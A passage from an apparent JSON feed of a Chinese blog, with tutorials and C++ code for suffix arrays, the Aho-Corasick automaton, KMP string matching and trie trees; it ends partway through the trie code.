class=\"line\">    //离散：把相等的字符串的rank设为相同。</span><br><span class=\"line\">    //LCP</span><br><span class=\"line\">    int j, k = 0;</span><br><span class=\"line\">    for(int i = 1; i &lt;= n; Height[rank[i ++]] = k) </span><br><span class=\"line\">        for( k = k ? k - 1 : k, j = SA[rank[i] - 1]; a[i + k] == a[j + k]; ++ k);</span><br><span class=\"line\">    //这个知道原理后就比较好理解程序</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void Init() &#123;</span><br><span class=\"line\">    scanf(&quot;%s&quot;, str);</span><br><span class=\"line\">    n = strlen(str);</span><br><span class=\"line\">    for (int i = 0; i &lt; n; i ++) a[i + 1] = str[i];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    Init();</span><br><span class=\"line\">    Suffix();</span><br><span class=\"line\"></span><br><span class=\"line\">    int ans = Height[2];</span><br><span class=\"line\">    for (int i = 3; i &lt;= n; i ++) ans += max(Height[i] - Height[i - 1], 0);</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;, ans);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"4个比较基础的应用\"><a href=\"#4个比较基础的应用\" class=\"headerlink\" title=\"4个比较基础的应用\"></a>4个比较基础的应用</h1><p>Q1：一个串中两个串的最大公共前缀是多少？<br>A1：这不就是Height吗？用rmq预处理，再O(1)查询。  </p>\n<p>Q2：一个串中可重叠的重复最长子串是多长？<br>A2：就是求任意两个后缀的最长公共前缀，而任意两个后缀的最长公共前缀都是Height 数组里某一段的最小值，那最长的就是Height中的最大值。  </p>\n<p>Q3：一个串种不可重叠的重复最长子串是多长？<br>A3：先二分答案，转化成判别式的问题比较好处理。假设当前需要判别长度为k是否符合要求，只需把排序后的后缀分成若干组，其中每组的后缀之间的Height 值都不小于k，再判断其中有没有不重复的后缀，具体就是看最大的SA值和最小的SA值相差超不超过k，有一组超过的话k就是合法答案。  </p>\n<p>A4：一个字符串不相等的子串的个数是多少？<br>Q4：每个子串一定是某个后缀的前缀，那么原问题等价于求所有后缀之间的不相同的前缀的个数。而且可以发现每一个后缀Suffix[SA[i]]的贡献是Len - SA[i] + 1,但是有子串算重复，重复的就是Heigh[i]个与前面相同的前缀，那么减去就可以了。最后，一个后缀Suffix[SA[i]]的贡献就是Len - SA[k] + 1 - Height[k]。<br>对于后缀数组更多的应用这里就不详细阐述，经过思考后每个人都会发现它的一些不同的用途，它的功能也许比你想象中的更强大！  </p>\n<h1 id=\"最开始的那道题\"><a href=\"#最开始的那道题\" class=\"headerlink\" title=\"最开始的那道题\"></a>最开始的那道题</h1><p>先搬下来。。。  </p>\n<p>你可想想这道题：你有一个01串S，然后定义一个前缀最右边的位置就是这个前缀的结束位置。现在有很多个询问，每q个询问结束位置在l~r中不同前缀的最长公共后缀是多长？<br>|S|,q≤100000<br>时限4s  </p>\n<p>简单思路：首先可以把字符串反过来就是求后缀的最长公共前缀了，可以用SA求出height数组，然后用rmq预处理之后就是求两个位置间的最小值。然后对于一个区间，显然只有在SA数组中相邻的两个串可以贡献答案。<br>对于区间询问的问题可以用莫队处理，然后考虑加入一个后缀应该怎么处理，我们可以维护一个按SA数组排序的链表。假设我们先把所有位置的SA全部加入，然后按顺序删除，重新按顺序加入时就可以O(1)完成修改。那么按照这个思路我们可以用固定左端点的并查集，做到只加入，不删除，然后用O(n√n+nlogn)O(nn+nlogn)的复杂度完成这道题。  </p>\n<p><em>可能后面的处理方式比较麻烦，如果直接用splay维护区间中的后缀的话可以做到O(n√n</em>logn)O(nnlogn)，这个方法就比较直观，而SAM在个问题上还是有点无力的。这题只是为了说明SA相比于SAM还是有他的独到之处，特别是在处理后缀的lcp之类的问题上。  </p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/CPP%E7%AE%97%E6%B3%95AC%E8%87%AA%E5%8A%A8%E6%9C%BA/",
            "url": "https://mangpumo.github.io/2023/01/14/CPP%E7%AE%97%E6%B3%95AC%E8%87%AA%E5%8A%A8%E6%9C%BA/",
            "title": "CPP算法AC自动机",
            "date_published": "2023-01-13T20:00:23.000Z",
            "content_html": "<p>首先给定模式串”ash”,”shex”,”bcd”,”sha”,然后我们根据模式串建立如下trie树:<br><img data-src=\"https://img-blog.csdn.net/20181006092249946?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<p>然后我们再了解下一步:<br>ac自动机,就是在tire树的基础上,增加一个fail指针,如果当前点匹配失败,则将指针转移到fail指针指向的地方,这样就不用回溯,而可以路匹配下去了.(当前模式串后缀和fail指针指向的模式串部分前缀相同,如abce和bcd,我们找到c发现下一个要找的不是e,就跳到bcd中的c处,看看此处的下一个字符(d)是不是应该找的那一个)  </p>\n<p>一般,fail指针的构建都是用bfs实现的<br>首先每个模式串的首字母肯定是指向根节点的  </p>\n<p><img data-src=\"https://img-blog.csdn.net/20181006092859165?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<p>现在第一层bfs遍历完了,开始第二层<br>(根节点为第0层)第二层a的子节点为s,但是我们还是要从a-z遍历,如果不存在这个子节点我们就让他指向根节点(如下图红色的a)</p>\n<p><img data-src=\"https://img-blog.csdn.net/20181006093044472?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<p>当我们遍历到s的时候,由于存在s这个节点,我们就让他的fail指针指向他父亲节点(a)的fail指针指向的那个节点(根)的具有相同字母的子节点(第一层的s),也就是这样</p>\n<p><img data-src=\"https://img-blog.csdn.net/20181006093334238?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<p>按照相同规律构建第二层后,到了第三层的h点,还是按照上面的规则,我们找到h的父亲节点(s)fail指针指向的那个位置(第一层的s)然后指向它所指向的相同字母根-&gt;s-&gt;h的这个链的h节点,如下图</p>\n<p><img data-src=\"https://img-blog.csdn.net/20181006093412877?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<p>完全构造好后的树</p>\n<p><img data-src=\"https://img-blog.csdn.net/2018100609362045?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<p>然后匹配就很简单了,这里以ashe为例<br>我们先用ash匹配,到h了发现:诶这里ash是一个完整的模式串,好的ans++,然后找下一个e,可是ash后面没字母了啊,我们就跳到hfail指针指向的那个h继续找,还是没有?再跳,结果当前的h指向的是根节点,又从根节点找,然而还是没有找到e,程序END  </p>\n<p>过程如下图  </p>\n<p><img data-src=\"https://img-blog.csdn.net/20181006093706548?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<p>喜闻乐见模板系列</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#include &lt;queue&gt;</span><br><span class=\"line\">#include &lt;cstdlib&gt;</span><br><span class=\"line\">#include &lt;cmath&gt;</span><br><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">const int maxn =  2*1e6+9;</span><br><span class=\"line\"></span><br><span class=\"line\">int trie[maxn][26]; //字典树</span><br><span class=\"line\">int cntword[maxn];  //记录该单词出现次数</span><br><span class=\"line\">int fail[maxn];     //失败时的回溯指针</span><br><span class=\"line\">int cnt = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">void insertWords(string s)&#123;</span><br><span class=\"line\">    int root = 0;</span><br><span class=\"line\">    for(int i=0;i&lt;s.size();i++)&#123;</span><br><span class=\"line\">        int next = s[i] - &#x27;a&#x27;;</span><br><span class=\"line\">        if(!trie[root][next])</span><br><span class=\"line\">            trie[root][next] = ++cnt;</span><br><span class=\"line\">        root = trie[root][next];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    cntword[root]++;      //当前节点单词数+1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void getFail()&#123;</span><br><span class=\"line\">    queue &lt;int&gt;q;</span><br><span class=\"line\">    for(int i=0;i&lt;26;i++)&#123;      //将第二层所有出现了的字母扔进队列</span><br><span class=\"line\">        if(trie[0][i])&#123;</span><br><span class=\"line\">            fail[trie[0][i]] = 0;</span><br><span class=\"line\">            q.push(trie[0][i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//fail[now]    -&gt;当前节点now的失败指针指向的地方</span><br><span class=\"line\">tire[now][i] -&gt; 下一个字母为i+&#x27;a&#x27;的节点的下标为tire[now][i]</span><br><span class=\"line\">    while(!q.empty())&#123;</span><br><span class=\"line\">        int now = q.front();</span><br><span class=\"line\">        q.pop();</span><br><span class=\"line\"></span><br><span class=\"line\">        for(int i=0;i&lt;26;i++)&#123;      //查询26个字母</span><br><span class=\"line\">            if(trie[now][i])&#123;</span><br><span class=\"line\">                //如果有这个子节点为字母i+&#x27;a&#x27;,则</span><br><span class=\"line\">//让这个节点的失败指针指向(((他父亲节点)的失败指针所指向的那个节点)的下一个节点)</span><br><span class=\"line\">                //有点绕,为了方便理解特意加了括号</span><br><span class=\"line\"></span><br><span class=\"line\">                fail[trie[now][i]] = trie[fail[now]][i];</span><br><span class=\"line\">                q.push(trie[now][i]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            else//否则就让当前节点的这个子节点</span><br><span class=\"line\">                //指向当前节点fail指针的这个子节点</span><br><span class=\"line\">                trie[now][i] = trie[fail[now]][i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int query(string s)&#123;</span><br><span class=\"line\">    int now = 0,ans = 0;</span><br><span class=\"line\">    for(int i=0;i&lt;s.size();i++)&#123;    //遍历文本串</span><br><span class=\"line\">        now = trie[now][s[i]-&#x27;a&#x27;];  //从s[i]点开始寻找</span><br><span class=\"line\">        for(int j=now;j &amp;&amp; cntword[j]!=-1;j=fail[j])&#123;</span><br><span class=\"line\">            //一直向下寻找,直到匹配失败(失败指针指向根或者当前节点已找过).</span><br><span class=\"line\">            ans += cntword[j];</span><br><span class=\"line\">            cntword[j] = -1;    //将遍历国后的节点标记,防止重复计算</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    int n;</span><br><span class=\"line\">    string s;</span><br><span class=\"line\">    cin &gt;&gt; n;</span><br><span class=\"line\">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class=\"line\">        cin &gt;&gt; s ;</span><br><span class=\"line\">        insertWords(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fail[0] = 0;</span><br><span class=\"line\">    getFail();</span><br><span class=\"line\">    cin &gt;&gt; s ;</span><br><span class=\"line\">    cout &lt;&lt; query(s) &lt;&lt; endl;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/CPP%E7%9A%84KMP%E7%AE%97%E6%B3%95/",
            "url": "https://mangpumo.github.io/2023/01/14/CPP%E7%9A%84KMP%E7%AE%97%E6%B3%95/",
            "title": "CPP的KMP算法",
            "date_published": "2023-01-13T19:50:50.000Z",
            "content_html": "<h1 id=\"1-kmp算法简介\"><a href=\"#1-kmp算法简介\" class=\"headerlink\" title=\"1.kmp算法简介\"></a>1.kmp算法简介</h1><p>KMP是三位大牛：D.E.Knuth、J.H.Morris和V.R.Pratt同时发现的。<br>KMP算法其实就是一种改进的字符串匹配算法，关键是利用匹配后失败的信息，尽量减少模式串（W）与主串（T）的匹配次数以达到快速匹配的目的。具体实现就是实现一个next() 函数，函数本身包含了模式串的局部匹配信息。时间复杂度 O(m+n)。<br>如果考虑最笨的方法，我们可以将T[0]和W[0]进行匹配，如果相同则匹配下一个字符，直到出现不相同的情况，此时我们会丢弃前面的匹配信息，然后把T[1]跟W[0]匹配，循环进行，直到主串结束，或者出现匹配成功的情况。这种丢弃前面的匹配信息的方法，时间复杂度为O(m*n)。<br>KMP算法利用已经部分匹配这个有效信息，保持i指针（主串）不回溯，通过修改j指针，让模式串尽量地移动到有效的位置，具体可见下面一个例子。<br>如果主串为：a b c a b c d h i j k<br>模式串为：a b c e<br>当我们匹配到主串的第四个字符a时，可知a和e不相等，因此需要移向下一位，但其实我们并不需要从模式串中的第一位重新开始比较，因为主串中的前三个字符已经没有未匹配的a了，不可能匹配成功。  </p>\n<p><img data-src=\"https://i.loli.net/2018/01/30/5a706e671dc4d.jpg\"></p>\n<h1 id=\"2-next（）函数\"><a href=\"#2-next（）函数\" class=\"headerlink\" title=\"2.next（）函数\"></a>2.next（）函数</h1><p>因此，最关键的是找到如何移动j指针。我们记当匹配失败时，j要移动的下一个位置为k（即next[j]&#x3D; k)。记P为模式串。<br>很显然，存在这样一个性质：最前面的k个位置（对于模式串来说）和j之前的最后k个字符（主串）是一样的。因此得到公式：  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P[0 ~ k-1] == P[j-k ~ j-1]</span><br></pre></td></tr></table></figure>\n\n<p>当P[k] &#x3D;&#x3D; p[j]时  </p>\n<p>有P[0 ~ k-1] + P[k] &#x3D;&#x3D; p[j-k ~ j-1] + P[j]，即：P[0 ~ k] &#x3D;&#x3D; P[j-k ~ j]，因此可得</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">next[j+1] == k + 1 == next[j] + 1</span><br></pre></td></tr></table></figure>\n\n<p>当P[k] !&#x3D; p[j]时</p>\n<p>我们只能在0~k-1中去寻找最长后缀串了，因此为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k = next[k]</span><br></pre></td></tr></table></figure>\n\n<p>使用C++ 实现next函数为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int* getNext(string p)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int* next = new int[p.length()];</span><br><span class=\"line\">    next[0] = -1;           //while the first char not match, i++,j++</span><br><span class=\"line\">    int j = 0;</span><br><span class=\"line\">    int k = -1;</span><br><span class=\"line\">    while (j &lt; (int)p.length() - 1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (k == -1 || p[j] == p[k])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            j++;</span><br><span class=\"line\">            k++;</span><br><span class=\"line\">            next[j] = k;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            k = next[k];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return next;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"3-完整算法\"><a href=\"#3-完整算法\" class=\"headerlink\" title=\"3.完整算法\"></a>3.完整算法</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int KMP(string T,string p)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int i=0;</span><br><span class=\"line\">    int j=0;</span><br><span class=\"line\">    int* next=getNext(T);</span><br><span class=\"line\">    while (i &lt; (int)T.length() &amp;&amp; j &lt; (int)p.length())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (j == -1 || T[i] == p[j])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">            j++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            j=next[j];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (j == (int)p.length())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return i-j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return -1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/%E5%AD%97%E5%85%B8%E6%A0%91%E5%8F%8A%E5%85%B6CPP%E5%AE%9E%E7%8E%B0/",
            "url": "https://mangpumo.github.io/2023/01/14/%E5%AD%97%E5%85%B8%E6%A0%91%E5%8F%8A%E5%85%B6CPP%E5%AE%9E%E7%8E%B0/",
            "title": "字典树及其CPP实现",
            "date_published": "2023-01-13T19:46:08.000Z",
            "content_html": "<h1 id=\"1、什么是Trie树（参考）\"><a href=\"#1、什么是Trie树（参考）\" class=\"headerlink\" title=\"1、什么是Trie树（参考）\"></a>1、什么是Trie树（参考）</h1><p>rie树，即字典树，又称单词查找树或键树，是一种树形结构，是一种哈希树的变种。典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：最大限度地减少无谓的字符串比较，查询效率比哈希表高。Trie的核心思想是空间换时间。利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。</p>\n<h2 id=\"字典树3个基本性质：\"><a href=\"#字典树3个基本性质：\" class=\"headerlink\" title=\"字典树3个基本性质：\"></a>字典树3个基本性质：</h2><ul>\n<li>根节点不包含字符，除根节点外每一个节点都只包含一个字符。</li>\n<li>从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。</li>\n<li>每个节点的所有子节点包含的字符都不相同。</li>\n</ul>\n<p>假设有b，abc，abd，bcd，abcd，efg，hii 这6个单词，我们构建的树就是如下图这样的：<br><img data-src=\"https://img-blog.csdnimg.cn/20190408163008821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01PVV9JVA==,size_16,color_FFFFFF,t_70\"></p>\n<p>如上图所示，对于每一个节点，从根遍历到他的过程就是一个单词，如果这个节点被标记为红色，就表示这个单词存在，否则不存在。那么，对于一个单词，我只要顺着他从根走到对应的节点，再看这个节点是否被标记为红色就可以知道它是否出现过了。把这个节点标记为红色，就相当于插入了这个单词。这样一来我们查询和插入可以一起完成，所用时间仅仅为单词长度，在这一个样例，便是10。我们可以看到，trie树每一层的节点数是26^i级别的。所以为了节省空间。我们用动态链表，或者用数组来模拟动态。空间的花费，不会超过单词数×单词长度。</p>\n<h2 id=\"字典树的查询：\"><a href=\"#字典树的查询：\" class=\"headerlink\" title=\"字典树的查询：\"></a>字典树的查询：</h2><p>使用trie时，因为当查询如字符串abc是否为某个字符串的前缀时，显然以b,c,d….等不是以a开头的字符串就不用查找了。所以建立trie的复杂度为O(n<em>len)，而建立+查询在trie中是可以同时执行的，建立的过程也就可以成为查询的过程，hash就不能实现这个功能。所以总的复杂度为O(n</em>len)，实际查询的复杂度也只是O(len)。（说白了，就是Trie树的平均高度h为len，所以Trie树的查询复杂度为O（h）&#x3D;O（len））。</p>\n<h2 id=\"字典树优缺点：\"><a href=\"#字典树优缺点：\" class=\"headerlink\" title=\"字典树优缺点：\"></a>字典树优缺点：</h2><h3 id=\"优点：\"><a href=\"#优点：\" class=\"headerlink\" title=\"优点：\"></a>优点：</h3><ul>\n<li>插入，查询，删除等操作复杂度为O(h),其中h为单词的长度。为什么会这么快呢，本质是空间换时间（空间复杂度为26的h次方），利用指针来避免做其他不必要的查找。（初始化的时间复杂度为 n*O(h)，n为单词个数）；</li>\n<li>当储存大量单词或者说储存的单词有着共同前缀时节省了空间。（比如说用线性存储boy,boyfriend如用trie存储的差别）；</li>\n</ul>\n<h3 id=\"缺点：\"><a href=\"#缺点：\" class=\"headerlink\" title=\"缺点：\"></a>缺点：</h3><ul>\n<li>指针占用的空间，空间复杂度大。如果储存少量的单词，并不能节省空间</li>\n</ul>\n<h2 id=\"字典树的应用：\"><a href=\"#字典树的应用：\" class=\"headerlink\" title=\"字典树的应用：\"></a>字典树的应用：</h2><ul>\n<li>字符串检索：事先将已知的一些字符串（字典）的有关信息保存到trie树里，查找另外一些未知字符串是否出现过或者出现频率。</li>\n<li>字符串最长公共前缀（转化为寻找共同祖先问题）。</li>\n</ul>\n<h2 id=\"字典树和哈希表的比较（参考）：\"><a href=\"#字典树和哈希表的比较（参考）：\" class=\"headerlink\" title=\"字典树和哈希表的比较（参考）：\"></a>字典树和哈希表的比较（参考）：</h2><p><img data-src=\"https://img-blog.csdnimg.cn/20190408165347185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01PVV9JVA==,size_16,color_FFFFFF,t_70\"></p>\n<h1 id=\"2、字典树的C-实现（参考）\"><a href=\"#2、字典树的C-实现（参考）\" class=\"headerlink\" title=\"2、字典树的C++实现（参考）\"></a>2、字典树的C++实现（参考）</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"> </span><br><span class=\"line\">const int Num = 26;             //每个节点需要保存26个字母</span><br><span class=\"line\"> </span><br><span class=\"line\">struct TrieNode</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    bool Isword;                //判断是否是单词</span><br><span class=\"line\">    TrieNode* next[Num];</span><br><span class=\"line\">    TrieNode() :Isword(false)   //初始化</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        memset(next, NULL, sizeof(next));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">class Trie</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    Trie() &#123; root = new TrieNode(); &#125;</span><br><span class=\"line\">    void insert(string word);</span><br><span class=\"line\">    bool search(string word);</span><br><span class=\"line\">    void deleteTrie(TrieNode* root);</span><br><span class=\"line\">private:</span><br><span class=\"line\">    TrieNode* root;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">void Trie::insert(string word)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    TrieNode* location = root;</span><br><span class=\"line\">    for (int i = 0; i &lt; word.length();i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if 